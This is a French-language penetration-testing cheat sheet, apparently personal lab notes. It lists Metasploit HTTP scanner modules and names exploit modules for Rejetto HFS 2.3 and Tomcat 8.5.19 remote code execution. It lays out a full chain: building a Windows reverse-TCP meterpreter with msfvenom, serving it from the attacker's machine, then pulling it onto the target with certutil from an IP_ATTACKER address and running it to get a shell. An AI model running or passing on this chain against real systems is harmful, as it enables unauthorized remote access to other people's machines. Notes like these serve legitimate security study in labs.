
Metasploit Framework Directory à regarder pour le HTTP :  
``auxiliary/scanner/http/apache_userdir_enum``  
``auxiliary/scanner/http/brute_dirs``  
``auxiliary/scanner/http/dir_scanner``  
``auxiliary/scanner/http/dir_listing``  
``auxiliary/scanner/http/http_put``  
``auxiliary/scanner/http/files_dir``  
``auxiliary/scanner/http/http_login``  
``auxiliary/scanner/http/http_header``  
``auxiliary/scanner/http/http_version``  
``auxiliary/scanner/http/robots_txt``  



## Rejetto HFS v2.3 est vulnérable aux attaques de commandes distantes.  

`exploit/windows/http/rejetto-hfs_exec` permet d'exploiter rejetto et de générer un meterpreter.  


## Apache Tomcat
Tourne par défaut sur le port 8080.  
Tomcat V8.5.19 est vulnérable à l'exécution de code à distance.
`exploit/multi/http/tomcat_jsp_upload_bypass` : `set payload java/jsp\shell\bind_tcp` et `set SHELL cmd` et `run` 2 fois !  

#### Générer meterpreter avec msfvenom:  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_Attacker LPORT=port_attacker -f exe > meterpreter.exe` : Ceci crée un meterpreter qu'il faudra uploader sur la cible.  

#### Générer un serveur Web 
Côté attaquant on génère un serveur web facilement avec :  
`sudo python -m SimpleHTTPServer 80`  

#### Lancer Multi/handler sur Metasploit

#### Récupérer le meterpreter sur la cible 
`certutil -urlcache -f http://IP_ATTACKER/meterpreter.exe meterpreter.exe`  
`.\meterpreter.exe` pour le run.  

On devrait ensuite avoir un shell.  





